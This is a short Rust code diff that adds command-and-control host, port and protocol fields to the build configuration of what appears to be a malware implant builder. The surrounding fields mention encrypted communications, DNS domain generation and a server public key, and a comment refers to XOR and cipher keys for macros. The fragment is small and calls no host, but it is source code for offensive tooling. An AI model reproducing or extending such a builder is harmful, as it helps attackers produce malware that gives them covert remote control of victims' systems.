@@ -48,6 +48,9 @@ async fn compile(opts: BuildOptions, build_id: &str) -> anyhow::Result<String> {
         "encrypted_comms":   opts.encrypted_comms,
         "dns_dga":           opts.dns_dga,
         "server_pubkey":     opts.server_pubkey,
+        "c2_host":           opts.c2_host,
+        "c2_port":           opts.c2_port,
+        "protocol":          opts.protocol,
     });
 
     // 2. Random XOR key + cipher key for macros
